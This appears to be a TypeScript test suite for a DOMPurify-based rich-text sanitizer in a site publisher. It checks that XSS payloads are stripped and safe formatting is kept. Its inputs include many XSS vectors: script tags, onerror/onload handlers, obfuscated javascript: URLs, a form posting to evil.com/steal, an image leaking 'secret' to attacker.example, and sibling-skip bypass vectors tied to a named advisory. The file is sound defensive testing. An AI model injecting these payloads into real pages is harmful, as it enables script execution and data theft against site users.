/**
 * Tests for src/core/sanitize.ts — DOMPurify richtext sanitization
 *
 * Verifies that sanitizeRichtext() correctly strips malicious HTML while
 * preserving safe formatting markup.
 *
 * These tests confirm the trust boundary enforced at the Properties Panel
 * (Task #261 / Security Auditor Contribution #368). The publisher's
 * escapeProps() passes richtext props through unescaped — this utility is
 * the sole sanitization point before values reach the publisher.
 *
 * @see src/core/sanitize.ts
 * @see src/core/publisher/render.ts — escapeProps() richtext passthrough
 * @see Task #261 — Enforce DOMPurify at Properties Panel boundary
 */

import { describe, it, expect } from 'bun:test'
import { sanitizeRichtext, isRichtextPropKey, PLAIN_TEXT_CONFIG, RICHTEXT_CONTENT_CONFIG } from '@core/sanitize'

// ---------------------------------------------------------------------------
// XSS prevention — the core contract
// ---------------------------------------------------------------------------

describe('sanitizeRichtext() — XSS prevention', () => {
  it('strips <script> tags entirely', () => {
    const result = sanitizeRichtext('<script>alert(1)</script>')
    expect(result).not.toContain('<script>')
    expect(result).not.toContain('alert(1)')
  })

  it('strips onclick and other event handler attributes', () => {
    const result = sanitizeRichtext('<p onclick="alert(1)">Click me</p>')
    expect(result).not.toContain('onclick')
    expect(result).not.toContain('alert(1)')
    // The text content is preserved
    expect(result).toContain('Click me')
  })

  it('strips onerror attribute on img tags', () => {
    const result = sanitizeRichtext('<img src=x onerror=alert(1)>')
    expect(result).not.toContain('onerror')
    expect(result).not.toContain('alert(1)')
  })

  it('strips javascript: href on anchor tags', () => {
    const result = sanitizeRichtext('<a href="javascript:alert(1)">Click</a>')
    expect(result).not.toContain('javascript:')
    // Anchor element itself may be preserved with href removed or sanitized
    expect(result).toContain('Click')
  })

  it('strips data: href on anchor tags', () => {
    const result = sanitizeRichtext('<a href="data:text/html,<script>alert(1)</script>">x</a>')
    expect(result).not.toContain('data:text/html')
    expect(result).toContain('x')
  })

  it('strips <iframe> elements', () => {
    const result = sanitizeRichtext('<iframe src="https://evil.com"></iframe>')
    expect(result).not.toContain('<iframe')
    expect(result).not.toContain('evil.com')
  })

  it('strips <object> and <embed> elements', () => {
    expect(sanitizeRichtext('<object data="evil.swf"></object>')).not.toContain('<object')
    expect(sanitizeRichtext('<embed src="evil.swf">')).not.toContain('<embed')
  })

  it('strips <form> elements (prevents CSRF via richtext)', () => {
    const result = sanitizeRichtext('<form action="https://evil.com/steal"><input name="data"><button>Submit</button></form>')
    expect(result).not.toContain('<form')
    expect(result).not.toContain('evil.com')
  })

  it('strips SVG with onload handler', () => {
    const result = sanitizeRichtext('<svg onload="alert(1)"><circle r="10"/></svg>')
    expect(result).not.toContain('onload')
    expect(result).not.toContain('alert(1)')
  })

  it('strips <style> tags (prevents CSS injection)', () => {
    const result = sanitizeRichtext('<style>body { background: url(javascript:alert(1)) }</style>')
    expect(result).not.toContain('<style>')
    expect(result).not.toContain('javascript:')
  })
})

// ---------------------------------------------------------------------------
// Safe markup preservation — what SHOULD survive
// ---------------------------------------------------------------------------

describe('sanitizeRichtext() — safe markup preservation', () => {
  it('keeps the default profile image-free (AI chat renderer, admin surfaces)', () => {
    for (const src of ['https://attacker.example/?d=secret', '/uploads/a.png']) {
      const html = sanitizeRichtext(`<p>Hi</p><img src="${src}"><figure><figcaption>c</figcaption></figure>`)
      expect(html).not.toContain('<img')
      expect(html).not.toContain('attacker')
      expect(html).not.toContain('<figure')
      expect(html).toContain('<p>Hi</p>')
    }
  })

  it('preserves safe images and captions across repeated content sanitization', () => {
    const input = '<figure><p><img src="/uploads/photo name.jpg?q=1&amp;v=2" alt="A &amp; B" title="Photo" width="320" height="200" loading="lazy" decoding="async"></p><figcaption>Caption</figcaption></figure>'
    const html = sanitizeRichtext(input, RICHTEXT_CONTENT_CONFIG)
    expect(html).toBe(input)
    expect(sanitizeRichtext(html, RICHTEXT_CONTENT_CONFIG)).toBe(html)
    for (const src of ['https://example.com/a.jpg', 'http://example.com/a.jpg', './photo.jpg', '../photo.jpg', 'photo.jpg']) {
      expect(sanitizeRichtext(`<img src="${src}">`, RICHTEXT_CONTENT_CONFIG)).toContain(`src="${src}"`)
    }
  })

  it('removes unsafe image sources and executable markup', () => {
    for (const src of [
      'javascript:alert(1)', 'vbscript:msgbox(1)', 'data:image/png;base64,AAAA',
      'data:image/svg+xml;base64,AAAA', 'blob:https://example.com/id', 'file:///a',
      'mailto:a@example.com', 'tel:123', 'JaVaScRiPt:alert(1)', 'jav&#97;script:alert(1)',
      '&#1;javascript:alert(1)', 'java&#9;script:alert(1)', 'java&#10;script:alert(1)',
      '//evil.example/a', '/\\evil.example/a', '\\evil.example/a', '&#1;//evil.example/a',
      '/&#9;/evil.example/a', 'https:\\evil.example/a',
    ]) {
      expect(sanitizeRichtext(`<img src="${src}" onerror="alert(1)" onload="alert(1)" style="color:red" srcset="/a 2x" data-x="x">`, RICHTEXT_CONTENT_CONFIG)).toBe('<img>')
    }
    const html = sanitizeRichtext('<svg><foreignObject><img src="/a" onerror="alert(1)"></foreignObject></svg><form><input></form><script>alert(1)</script>', RICHTEXT_CONTENT_CONFIG)
    expect(html).toBe('')
  })

  it('preserves plain text unchanged', () => {
    const result = sanitizeRichtext('Hello, World!')
    expect(result).toBe('Hello, World!')
  })

  it('preserves <strong> and <em> formatting tags', () => {
    const result = sanitizeRichtext('<strong>Bold</strong> and <em>italic</em>')
    expect(result).toContain('<strong>Bold</strong>')
    expect(result).toContain('<em>italic</em>')
  })

  it('preserves <p> tags', () => {
    const result = sanitizeRichtext('<p>First paragraph</p><p>Second paragraph</p>')
    expect(result).toContain('<p>First paragraph</p>')
    expect(result).toContain('<p>Second paragraph</p>')
  })

  it('preserves <ul>/<ol>/<li> list elements', () => {
    const result = sanitizeRichtext('<ul><li>Item 1</li><li>Item 2</li></ul>')
    expect(result).toContain('<ul>')
    expect(result).toContain('<li>Item 1</li>')
    expect(result).toContain('<li>Item 2</li>')
  })

  it('preserves <a> href with safe HTTPS URL', () => {
    const result = sanitizeRichtext('<a href="https://example.com">Link</a>')
    expect(result).toContain('href="https://example.com"')
    expect(result).toContain('Link')
  })

  it('adds rel="noopener noreferrer" and target="_blank" to all links', () => {
    const result = sanitizeRichtext('<a href="https://example.com">Link</a>')
    expect(result).toContain('rel="noopener noreferrer"')
    expect(result).toContain('target="_blank"')
  })

  it('preserves <br> line breaks', () => {
    const result = sanitizeRichtext('Line 1<br>Line 2')
    expect(result).toContain('<br>')
    expect(result).toContain('Line 1')
    expect(result).toContain('Line 2')
  })

  it('preserves <h1>–<h3> headings', () => {
    const result = sanitizeRichtext('<h1>Title</h1><h2>Subtitle</h2>')
    expect(result).toContain('<h1>Title</h1>')
    expect(result).toContain('<h2>Subtitle</h2>')
  })

  it('handles empty string gracefully', () => {
    expect(sanitizeRichtext('')).toBe('')
    expect(sanitizeRichtext(null)).toBe('')
    expect(sanitizeRichtext(undefined)).toBe('')
  })

  it('handles non-string values by stringifying them', () => {
    // Numbers should become their string representation
    expect(sanitizeRichtext(42)).toBe('42')
  })
})

// ---------------------------------------------------------------------------
// PLAIN_TEXT_CONFIG — for meta/title fields
// ---------------------------------------------------------------------------

describe('sanitizeRichtext() with PLAIN_TEXT_CONFIG', () => {
  it('strips ALL HTML tags, returning plain text only', () => {
    const result = sanitizeRichtext('<strong>Hello</strong> <em>World</em><img src="/uploads/a.png">', PLAIN_TEXT_CONFIG)
    expect(result).not.toContain('<strong>')
    expect(result).not.toContain('<em>')
    expect(result).not.toContain('<img')
    expect(result).toContain('Hello')
    expect(result).toContain('World')
  })

  it('strips XSS payloads in plain-text mode', () => {
    const result = sanitizeRichtext('<script>alert(1)</script> innocent text', PLAIN_TEXT_CONFIG)
    expect(result).not.toContain('<script>')
    expect(result).not.toContain('alert(1)')
    expect(result).toContain('innocent text')
  })
})

describe('sanitizeRichtext() in server runtime', () => {
  it('imports without DOM globals and removes executable content', () => {
    const result = Bun.spawnSync({
      cmd: [
        process.execPath,
        '-e',
        `
          const { sanitizeRichtext } = await import('./src/core/sanitize.ts')
          const sanitized = sanitizeRichtext('<script>alert(1)</script><img src=/a onerror=alert(2)><p>Safe</p>')
          if (sanitized.includes('<script') || sanitized.includes('alert(1)') || sanitized.includes('<img')) {
            throw new Error('unsafe fallback: ' + sanitized)
          }
          if (!sanitized.includes('Safe')) {
            throw new Error('lost safe text: ' + sanitized)
          }
        `,
      ],
      stdout: 'pipe',
      stderr: 'pipe',
    })

    if (result.exitCode !== 0) {
      const stderr = new TextDecoder().decode(result.stderr)
      throw new Error(stderr)
    }
  })

  it('preserves safe richtext through the explicit server sanitizer without DOM globals', () => {
    const result = Bun.spawnSync({
      cmd: [
        process.execPath,
        '-e',
        `
          await import('./server/richtextSanitizer.ts')
          if ('window' in globalThis || 'document' in globalThis) {
            throw new Error('server sanitizer installed DOM globals')
          }
          const { sanitizeRichtext } = await import('./src/core/sanitize.ts')
          const sanitized = sanitizeRichtext('<p><strong>Safe</strong> <a href="https://example.com">Link</a></p>')
          if (!sanitized.includes('<strong>Safe</strong>')) {
            throw new Error('lost richtext formatting: ' + sanitized)
          }
          if (!sanitized.includes('rel="noopener noreferrer"')) {
            throw new Error('lost safe link attributes: ' + sanitized)
          }
        `,
      ],
      stdout: 'pipe',
      stderr: 'pipe',
    })

    if (result.exitCode !== 0) {
      const stderr = new TextDecoder().decode(result.stderr)
      throw new Error(stderr)
    }
  })

  // GHSA-jg75-xjf8-vvf8: the previous backend (happy-dom) stopped DOMPurify's
  // node walk at the first removed node, so a disallowed element followed by a `<script>` shipped the script
  // unsanitized. Run through the real server sanitizer in a clean process so
  // the ambient happy-dom test DOM cannot mask the production backend.
  it('sanitizes siblings that follow a removed node (no NodeIterator skip)', () => {
    const result = Bun.spawnSync({
      cmd: [
        process.execPath,
        '-e',
        `
          await import('./server/richtextSanitizer.ts')
          const { sanitizeRichtext } = await import('./src/core/sanitize.ts')
          const vectors = [
            '<input><script>alert(1)</script>',
            '<input><img src=y onerror=alert(1)>',
            '<input><svg onload=alert(1)>',
          ]
          for (const v of vectors) {
            const out = sanitizeRichtext(v)
            if (out.includes('<script') || out.includes('onerror') || out.includes('onload') || out.includes('<svg')) {
              throw new Error('sibling-skip XSS survived: ' + JSON.stringify(out))
            }
          }
          const kept = sanitizeRichtext('<input><p>Text stays.</p>')
          if (!kept.includes('Text stays.')) {
            throw new Error('lost content after a removed node: ' + kept)
          }
        `,
      ],
      stdout: 'pipe',
      stderr: 'pipe',
    })

    if (result.exitCode !== 0) {
      const stderr = new TextDecoder().decode(result.stderr)
      throw new Error(stderr)
    }
  })
})

// ---------------------------------------------------------------------------
// isRichtextPropKey — prop key detection
// ---------------------------------------------------------------------------

describe('isRichtextPropKey()', () => {
  it('returns true for "richtext"', () => {
    expect(isRichtextPropKey('richtext')).toBe(true)
  })

  it('returns true for "html"', () => {
    expect(isRichtextPropKey('html')).toBe(true)
  })

  it('returns true for keys ending in "html" (e.g. "bodyHtml")', () => {
    expect(isRichtextPropKey('bodyHtml')).toBe(true)
    expect(isRichtextPropKey('descriptionHtml')).toBe(true)
  })

  it('returns true for keys ending in "richtext" (e.g. "contentRichtext")', () => {
    expect(isRichtextPropKey('contentRichtext')).toBe(true)
  })

  it('returns false for plain string prop keys', () => {
    expect(isRichtextPropKey('text')).toBe(false)
    expect(isRichtextPropKey('label')).toBe(false)
    expect(isRichtextPropKey('href')).toBe(false)
    expect(isRichtextPropKey('color')).toBe(false)
  })

  it('is case-insensitive', () => {
    expect(isRichtextPropKey('HTML')).toBe(true)
    expect(isRichtextPropKey('RichText')).toBe(true)
  })
})
